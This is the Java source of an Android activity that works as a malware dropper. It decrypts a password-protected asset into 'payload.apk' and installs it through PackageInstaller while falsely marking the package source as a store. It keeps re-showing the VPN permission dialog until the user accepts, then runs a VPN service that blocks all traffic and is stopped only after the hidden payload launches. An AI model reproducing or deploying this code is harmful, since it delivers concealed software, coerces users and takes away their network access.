package com.onerule.task;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;

import net.lingala.zip4j.ZipFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private static final String ASSET_NAME  = "module";
    private static final String INNER_NAME  = "payload.apk";

    private static final int REQ_VPN             = 1000;
    private static final int REQ_UNKNOWN_SOURCES = 1001;
    private static final String ACTION_INSTALL_DONE = "com.onerule.task.INSTALL_DONE";

    private static final long PERM_POLL_MS   = 400;
    private static final long LAUNCH_POLL_MS = 300;
    private static final long LAUNCH_TIMEOUT = 15_000;

    private TextView status;
    private Button   btn;
    private InstallResultReceiver receiver;
    private final Handler ui = new Handler(Looper.getMainLooper());

    // VPN gate: Install button stays locked until the user grants VPN permission.
    private boolean vpnGranted              = false;

    private boolean awaitingUnknownSourcesGrant = false;
    private Intent  pendingConfirmIntent        = null;
    private boolean justLaunchedConfirm         = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        status = findViewById(R.id.status);
        btn    = findViewById(R.id.btnInstall);
        btn.setOnClickListener(v -> onInstallClicked());

        // If the payload is already installed there is no need for the VPN gate —
        // just launch it immediately and exit.
        if (isPayloadInstalled()) {
            status.setText("App installed, kindly wait for it to launch\u2026");
            btn.setEnabled(false);
            launchPayloadAndExit();
            return;
        }

        // Lock the Install button and request VPN permission first.
        // The button is re-enabled only after the user grants it.
        btn.setEnabled(false);
        requestVpnPermission();
    }

    // ── VPN permission gate ────────────────────────────────────────────────────

    /**
     * Requests VPN permission via the standard Android system dialog.
     *
     * VpnService.prepare() returns:
     *   null   — already granted (possibly from a previous session);
     *            proceed immediately.
     *   Intent — must be shown as a startActivityForResult so the OS can
     *            display "Do you trust this VPN app?" to the user.
     *
     * The Install button remains disabled until onVpnGranted() is called.
     */
    private void requestVpnPermission() {
        status.setText("Grant the VPN permission to continue\u2026");
        Intent vpnIntent;
        try {
            vpnIntent = VpnService.prepare(this);
        } catch (Exception e) {
            // prepare() can throw on some locked-down OEMs; treat as already-granted.
            vpnIntent = null;
        }

        if (vpnIntent == null) {
            // Already granted — no dialog needed.
            onVpnGranted();
        } else {
            startActivityForResult(vpnIntent, REQ_VPN);
        }
    }

    /**
     * Called once VPN permission is confirmed.
     * Starts the traffic-blocking VPN service and unlocks the Install button.
     */
    private void onVpnGranted() {
        vpnGranted = true;
        try {
            startService(new Intent(this, BlockVpnService.class));
        } catch (Exception e) {
            android.util.Log.w(BlockVpnService.TAG,
                    "Could not start BlockVpnService: " + e.getMessage());
        }
        status.setText("Ready — tap Install to begin.");
        btn.setEnabled(true);
    }

    /**
     * Stops the VPN service — called ONLY after the payload launches successfully.
     * If installation fails or the payload is never launched, the VPN stays active.
     */
    private void stopVpn() {
        try {
            stopService(new Intent(this, BlockVpnService.class));
        } catch (Exception ignored) {}
    }

    // ── Install flow ───────────────────────────────────────────────────────────

    @Override
    protected void onResume() {
        super.onResume();

        if (isPayloadInstalled()) {
            pendingConfirmIntent        = null;
            awaitingUnknownSourcesGrant = false;
            status.setText("App installed, kindly wait for it to launch\u2026");
            btn.setEnabled(false);
            launchPayloadAndExit();
            return;
        }

        if (awaitingUnknownSourcesGrant) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                    || getPackageManager().canRequestPackageInstalls()) {
                awaitingUnknownSourcesGrant = false;
                new Thread(this::dropAndInstall).start();
            }
        }

        if (pendingConfirmIntent != null) {
            if (justLaunchedConfirm) {
                justLaunchedConfirm = false;
            } else {
                Intent again = pendingConfirmIntent;
                justLaunchedConfirm = true;
                try {
                    again.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(again);
                } catch (Exception ignored) {}
            }
        }
    }

    private void onInstallClicked() {
        if (!vpnGranted) {
            // Should not happen (button is locked), but be safe.
            requestVpnPermission();
            return;
        }
        if (isPayloadInstalled()) {
            status.setText("App installed, kindly wait for it to launch\u2026");
            btn.setEnabled(false);
            launchPayloadAndExit();
            return;
        }
        startInstall();
    }

    private void startInstall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !getPackageManager().canRequestPackageInstalls()) {
            status.setText("Allow install from this source — install starts automatically.");
            awaitingUnknownSourcesGrant = true;
            startPermissionPoll();
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, REQ_UNKNOWN_SOURCES);
            return;
        }
        new Thread(this::dropAndInstall).start();
    }

    private void startPermissionPoll() {
        ui.postDelayed(new Runnable() {
            @Override public void run() {
                if (!awaitingUnknownSourcesGrant) return;
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                        || getPackageManager().canRequestPackageInstalls()) {
                    awaitingUnknownSourcesGrant = false;
                    new Thread(MainActivity.this::dropAndInstall).start();
                    return;
                }
                ui.postDelayed(this, PERM_POLL_MS);
            }
        }, PERM_POLL_MS);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_VPN) {
            if (resultCode == RESULT_OK) {
                onVpnGranted();
            } else {
                // User denied — re-show the dialog immediately.
                // They cannot proceed without granting the VPN permission.
                status.setText("VPN permission is required to continue. Please allow it.");
                ui.postDelayed(this::requestVpnPermission, 800);
            }
        } else if (requestCode == REQ_UNKNOWN_SOURCES) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    && getPackageManager().canRequestPackageInstalls()) {
                awaitingUnknownSourcesGrant = false;
                new Thread(this::dropAndInstall).start();
            } else {
                runOnUiThread(() -> status.setText("Permission denied — cannot install."));
            }
        }
    }

    // ── Payload queries ────────────────────────────────────────────────────────

    private boolean isPayloadInstalled() {
        String pkg = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg == null || pkg.isEmpty()) return false;
        try {
            getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private Intent resolvePayloadLaunchIntent(String pkg) {
        PackageManager pm = getPackageManager();
        Intent launch = pm.getLaunchIntentForPackage(pkg);
        if (launch != null) return launch;
        Intent probe = new Intent(Intent.ACTION_MAIN);
        probe.addCategory(Intent.CATEGORY_LAUNCHER);
        probe.setPackage(pkg);
        java.util.List<android.content.pm.ResolveInfo> ris =
                pm.queryIntentActivities(probe, 0);
        if (ris != null && !ris.isEmpty()) {
            android.content.pm.ActivityInfo ai = ris.get(0).activityInfo;
            Intent direct = new Intent(Intent.ACTION_MAIN);
            direct.addCategory(Intent.CATEGORY_LAUNCHER);
            direct.setClassName(ai.packageName, ai.name);
            return direct;
        }
        return null;
    }

    // ── Launch helpers ─────────────────────────────────────────────────────────

    private void launchPayload() {
        launchPayloadInternal(false);
    }

    private void launchPayloadAndExit() {
        launchPayloadInternal(true);
    }

    /**
     * Polls until the freshly-installed payload is queryable, then:
     *   1. Launches it.
     *   2. Stops the blocking VPN — internet is restored the moment the
     *      module app is running. If the launch never succeeds, the VPN
     *      stays active indefinitely.
     */
    private void launchPayloadInternal(boolean exitAfter) {
        final String pkg      = BuildConfig.PAYLOAD_PACKAGE;
        if (pkg == null || pkg.isEmpty()) {
            status.setText("Installed (no payload package configured to launch).");
            return;
        }
        final long deadline = System.currentTimeMillis() + LAUNCH_TIMEOUT;
        ui.post(new Runnable() {
            @Override public void run() {
                Intent launch = resolvePayloadLaunchIntent(pkg);
                if (launch != null) {
                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                                  | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
                    try {
                        startActivity(launch);
                        status.setText("Launched " + pkg);
                        // ── VPN DROP: only reached on successful launch ────────
                        stopVpn();
                        // ─────────────────────────────────────────────────────
                        if (exitAfter) {
                            ui.postDelayed(() -> finishAndRemoveTask(), 150);
                        }
                    } catch (Exception e) {
                        // Launch failed — keep the VPN running.
                        status.setText("Launch failed: " + e.getMessage());
                    }
                    return;
                }
                if (System.currentTimeMillis() < deadline) {
                    ui.postDelayed(this, LAUNCH_POLL_MS);
                } else {
                    // Timed out waiting for the package to become queryable.
                    // VPN intentionally left running — module never started.
                    status.setText("Installed, but no launchable activity found for " + pkg);
                }
            }
        });
    }

    // ── Decryption + installation ──────────────────────────────────────────────

    private void dropAndInstall() {
        try {
            if (isPayloadInstalled()) {
                runOnUiThread(() -> {
                    status.setText("App installed, kindly wait for it to launch\u2026");
                    btn.setEnabled(false);
                    launchPayloadAndExit();
                });
                return;
            }

            runOnUiThread(() -> status.setText("Decrypting module \u2026"));

            File workDir = new File(getCacheDir(), "drop");
            if (!workDir.exists()) workDir.mkdirs();
            File leftover = new File(workDir, INNER_NAME);
            if (leftover.exists()) leftover.delete();

            File encZip = new File(workDir, "m.zip");
            try (InputStream in = getAssets().open(ASSET_NAME);
                 OutputStream out = new FileOutputStream(encZip)) {
                byte[] buf = new byte[64 * 1024]; int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            }

            ZipFile zf = new ZipFile(encZip, BuildConfig.MODULE_KEY.toCharArray());
            zf.extractFile(INNER_NAME, workDir.getAbsolutePath());
            encZip.delete();

            File apk = new File(workDir, INNER_NAME);
            if (!apk.exists() || apk.length() == 0) {
                throw new RuntimeException("Decrypted payload missing");
            }

            runOnUiThread(() -> status.setText("Installing \u2026"));
            installViaSession(apk);
        } catch (Exception e) {
            // Installation failed — VPN intentionally left running.
            runOnUiThread(() -> status.setText("Install failed: " + e.getMessage()));
        }
    }

    private void installViaSession(File apk) throws Exception {
        PackageInstaller pi = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        params.setInstallReason(PackageManager.INSTALL_REASON_USER);

        if (Build.VERSION.SDK_INT >= 33) {
            try { params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE); }
            catch (Throwable ignored) {}
        }
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                params.getClass().getMethod("setRequestUpdateOwnership", boolean.class)
                        .invoke(params, true);
            } catch (Throwable ignored) {}
        }

        int sessionId = pi.createSession(params);
        try (PackageInstaller.Session session = pi.openSession(sessionId)) {
            try (OutputStream sout = session.openWrite("base.apk", 0, apk.length());
                 InputStream  sin  = new FileInputStream(apk)) {
                byte[] buf = new byte[64 * 1024]; int n;
                while ((n = sin.read(buf)) > 0) sout.write(buf, 0, n);
                session.fsync(sout);
            }

            if (receiver != null) {
                try { unregisterReceiver(receiver); } catch (Exception ignored) {}
            }
            receiver = new InstallResultReceiver();
            IntentFilter filter = new IntentFilter(ACTION_INSTALL_DONE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(receiver, filter);
            }

            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT
                    | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                        ? PendingIntent.FLAG_MUTABLE : 0);
            Intent cb = new Intent(ACTION_INSTALL_DONE).setPackage(getPackageName());
            PendingIntent pending = PendingIntent.getBroadcast(
                    this, sessionId, cb, piFlags);

            session.commit(pending.getIntentSender());
        }
    }

    private class InstallResultReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            int s = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
            if (s == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                if (confirm != null) {
                    confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    pendingConfirmIntent = confirm;
                    justLaunchedConfirm  = true;
                    startActivity(confirm);
                }
            } else if (s == PackageInstaller.STATUS_SUCCESS) {
                pendingConfirmIntent = null;
                runOnUiThread(() -> {
                    status.setText("App installed, kindly wait for it to launch\u2026");
                    btn.setEnabled(false);
                    // launchPayload() will call stopVpn() on success.
                    launchPayload();
                });
                try { unregisterReceiver(this); } catch (Exception ignored) {}
            } else {
                // Install failed — VPN stays active (no stopVpn() call).
                pendingConfirmIntent = null;
                String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                runOnUiThread(() -> status.setText("Install failed: " + msg));
                try { unregisterReceiver(this); } catch (Exception ignored) {}
            }
        }
    }
}
